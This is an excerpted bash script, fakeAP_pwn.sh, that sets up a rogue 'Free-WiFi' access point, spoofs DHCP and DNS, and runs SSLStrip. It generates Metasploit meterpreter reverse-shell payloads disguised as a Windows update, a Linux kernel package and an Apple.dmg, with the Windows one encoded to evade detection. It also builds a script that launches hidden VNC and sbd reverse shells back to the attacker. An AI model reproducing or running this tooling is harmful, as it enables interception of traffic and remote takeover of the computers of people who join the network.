...
# fakeAP_pwn.sh (v0.3-RC6 2010-07-06)
#
# Make sure to copy "www": cp www/* /var/www/fakeAP_pwn/
# The VNC password is "g0tmi1k" (without "")
#
#ToDo List:
# OSs (Linux/OSX/x64) - Make compatible ;)
# Java exploit        - Different delivery system
# Monitor traffic     - That isn't on port 80, before they download the payload
# Multiple client     - Each time a new client connects they will be redirected to our crafted page without affecting any other clients who are browsing
# Firewall Rule(s)    - Don't expose local machines from the internet interface

#-----------------------------------------------------------------------------------------------
# Defaults *** Change theses ***
export            ESSID="Free-WiFi"                  # The ESSID of the new wireless network.
export    fakeAPchannel=6                            # Set the channel for the FakeAP to run on
export        interface=eth0                         # The interface you use to surf the internet (Use ifconfig!)
export    wifiInterface=wlan0                        # The interface you want to use for the fake AP (must support monitor mode!) (Use ifconfig!)
...
export      respond2All=false                        # true/false - Respond to every probe request? true = yes, false = no
export        fakeAPmac=true                         # true/false - Randomize the MAC Address of the FakeAP? true = yes, false = no
...
export          verbose=0                            # 0/1/2 - Verbose mode (Displays exactly whats going on.)
#-----------------------------------------------------------------------------------------------
...
function cleanup() {
   ...
   if [ "$debug" != "true" ]; then
      ...
      if test -e $htdocs_folder/Apple.dmg;                        then rm $htdocs_folder/Apple.dmg; fi
...
function update() {
   svn checkout http://fakeap-pwn.googlecode.com/svn/trunk/ /pentest/wireless/fakeap-pwn
   cd /pentest/wireless/fakeap-pwn
   svn update
   exit 2
}
...
if [ "$debug" == "true" ] || [ "$verbose" != "0" ] ; then
    echo "
[i]            ESSID=$ESSID
[i]    fakeAPchannel=$fakeAPchannel
[i]        interface=$interface
[i]    wifiInterface=$wifiInterface
[i] monitorInterface=$monitorInterface
[i]          payload=$payload
[i]     backdoorPath=$backdoorPath
[i]   metasploitPath=$metasploitPath
[i]    htdocs_folder=$htdocs_folder
[i]              mtu=$mtu
[i]      transparent=$transparent
[i]      respond2All=$respond2All
[i]        fakeAPmac=$fakeAPmac
[i]           extras=$extras
[i]            debug=$debug
[i]        gatewayIP=$gatewayIP
[i]            ourIP=$ourIP
[i]             port=$port
"
fi
...
if ! test -e /usr/sbin/airmon-ng; then echo -e "\e[00;31m[-]\e[00m Aircrack-ng isn't installed."; cleanup; fi
if ! test -e /usr/sbin/apache2; then echo -e "\e[00;31m[-]\e[00m Apache2 isn't installed."; cleanup; fi
if ! test -e /usr/bin/macchanger; then echo -e "\e[00;31m[-]\e[00m MacChanger isn't installed."; cleanup; fi
if ! test -e /usr/sbin/dhcpd3; then echo -e "\e[00;31m[-]\e[00m dhcpd3 isn't installed."; cleanup; fi
if ! [ -d "$metasploitPath" ]; then echo -e "\e[00;31m[-]\e[00m Metasploit isn't at $metasploitPath."; cleanup; fi
...
if test ! -e "$htdocs_folder/index.php"; then
   if test -e "www/"; then
   if [ "$verbose" == "2" ] ; then echo "[i] Command: cp www/* $htdocs_folder/"; fi
   $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Copying www" -e "cp www/* $htdocs_folder/"
      if test ! -e "$htdocs_folder/index.php"; then
         echo -e "\e[00;31m[-]\e[00m Missing index.php. Did you run: cp www/* $htdocs_folder/"
         cleanup
      fi
   fi
fi
...
if [ "$verbose" == "2" ] ; then echo "[i] Command: killall -9 dhcpd3 apache2 airbase-ng wicd-client"; fi
$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Killing 'Programs'" -e "killall -9 dhcpd3 apache2 airbase-ng wicd-client"   # Killing "wicd-client" to prevent channel hopping
...
session.sys.process.execute(\"C:\\\winvnc.exe -connect $ourIP\", nil, {'Hidden' => true})   #Had a problem with %SystemDrive%" >> /tmp/fakeAP_pwn.rb
elif [ "$payload" == "sbd" ]; then
   echo "print_status(\"Executing SBD...\")
session.sys.process.execute(\"C:\\\sbd.exe -q -r 10 -k g0tmi1k -e cmd -p $port $ourIP\", nil, {'Hidden' => true})   #Had a problem with %SystemDrive%" >> /tmp/fakeAP_pwn.rb
elif [ "$payload" == "wkv" ]; then
...
subnet 10.0.0.0 netmask 255.255.255.0 {
  ...
  option netbios-name-servers 10.0.0.100; # The NetBIOS name server (WINS)
}" > /tmp/fakeAP_pwn.dhcp
...
if [ "$transparent" != "true" ]; then
   echo "* A 10.0.0.1
www.* PTR 10.0.0.1" > /tmp/fakeAP_pwn.dns
   if [ "$debug" == "true" ] ; then cat /tmp/fakeAP_pwn.dns; fi
fi

#echo -e "\e[01;32m[>]\e[00m Creating exploit.(Linux)"
#if [ "$verbose" == "2" ] ; then echo "[i] Command: $metasploitPath/msfpayload linux/x86/shell/reverse_tcp LHOST=$ourIP LPORT=LPORT=4566 X > $htdocs_folder/kernal_1.83.90-5+lenny2_i386.deb"; fi
#xterm -geometry 75x10+10+100 -T "fakeAP_pwn v$version - Metasploit (Linux)" -e "$metasploitPath/msfpayload linux/x86/shell/reverse_tcp LHOST=$ourIP LPORT=LPORT=4566 X > $htdocs_folder/kernal_1.83.90-5+lenny2_i386.deb"
#echo -e "\e[01;32m[>]\e[00m Creating exploit..(OSX)"
#if [ "$verbose" == "2" ] ; then echo "[i] Command: $metasploitPath/msfpayload osx/x86/shell_reverse_tcp LHOST=$ourIP LPORT=4565 X > $htdocs_folder/Apple.dmg"; fi
#xterm -geometry 75x10+10+110 -T "fakeAP_pwn v$version - Metasploit (OSX)" -e "$metasploitPath/msfpayload osx/x86/shell_reverse_tcp LHOST=$ourIP LPORT=4565 X > $htdocs_folder/Apple.dmg"
echo -e "\e[01;32m[>]\e[00m Creating exploit...(Windows)"
#if [ "$verbose" == "2" ] ; then echo "[i] Command: $metasploitPath/msfpayload windows/meterpreter/reverse_tcp LHOST=$ourIP LPORT=4564 X > $htdocs_folder/Windows-KB183905-x86-ENU.exe"; fi
#$xterm -geometry 75x15+10+0 -T "fakeAP_pwn v$version - Metasploit (Windows)" -e "$metasploitPath/msfpayload windows/meterpreter/reverse_tcp LHOST=$ourIP LPORT=4564 X > $htdocs_folder/Windows-KB183905-x86-ENU.exe"
#if [ "$verbose" == "2" ] ; then echo "[i] Command: $metasploitPath/msfpayload windows/meterpreter/reverse_tcp LHOST=$ourIP LPORT=4564 R | $metasploitPath/msfencode -e x86/shikata_ga_nai -c 5 -t raw | $metasploitPath/msfencode -e x86/countdown -c 2 -t raw | $metasploitPath/msfencode -e x86/shikata_ga_nai -c 5 -t raw | $metasploitPath/msfencode -x $htdocs_folder/sbd.exe -t exe -e x86/call4_dword_xor -c 2 -o $htdocs_folder/Windows-KB183905-x86-ENU.exe"; fi
#$xterm -geometry 75x15+10+0 -T "fakeAP_pwn v$version - Metasploit (Windows)" -e "$metasploitPath/msfpayload windows/meterpreter/reverse_tcp LHOST=$ourIP LPORT=4564 R | $metasploitPath/msfencode -e x86/shikata_ga_nai -c 5 -t raw | $metasploitPath/msfencode -e x86/countdown -c 2 -t raw | $metasploitPath/msfencode -e x86/shikata_ga_nai -c 5 -t raw | $metasploitPath/msfencode -x $htdocs_folder/sbd.exe -t exe -e x86/call4_dword_xor -c 2 -o $htdocs_folder/Windows-KB183905-x86-ENU.exe"
#if [ "$verbose" == "2" ] ; then echo "[i] Command: $metasploitPath/msfpayload windows/meterpreter/reverse_tcp LHOST=$ourIP LPORT=4564 R | $metasploitPath/msfencode -x $htdocs_folder/sbd.exe -t exe -e x86/shikata_ga_nai -c 10 -o $htdocs_folder/Windows-KB183905-x86-ENU.exe"; fi
$xterm -geometry 75x15+10+0 -T "fakeAP_pwn v$version - Metasploit (Windows)" -e "$metasploitPath/msfpayload windows/meterpreter/reverse_tcp LHOST=$ourIP LPORT=4564 R | $metasploitPath/msfencode -x $htdocs_folder/sbd.exe -t exe -e x86/shikata_ga_nai -c 10 -o $htdocs_folder/Windows-KB183905-x86-ENU.exe"
...
if [ "$verbose" == "2" ] ; then echo "[i] Command: SSLStrip" -e "sslstrip -k -f -l 10000"; fi
$xterm -geometry 0x0+0+0 -T "fakeAP_pwn v$version - SSLStrip" -e "sslstrip -k -f -l 10000" &

echo -e "\e[01;32m[>]\e[00m Starting DHCP server..."
if [ "$verbose" == "2" ] ; then echo "[i] Command: SSLStrip" -e "dhcpd3 -d -f -cf /tmp/fakeAP_pwn.dhcp at0"; fi
$xterm -geometry 75x7+10+95 -T "fakeAP_pwn v$version - DHCP" -e "dhcpd3 -d -f -cf /tmp/fakeAP_pwn.dhcp at0" & # -d = logging, -f = forground
sleep 2
...
# Could of done this at the start, but we were not ready for them then! JUST PORT 80 MIND YOU!
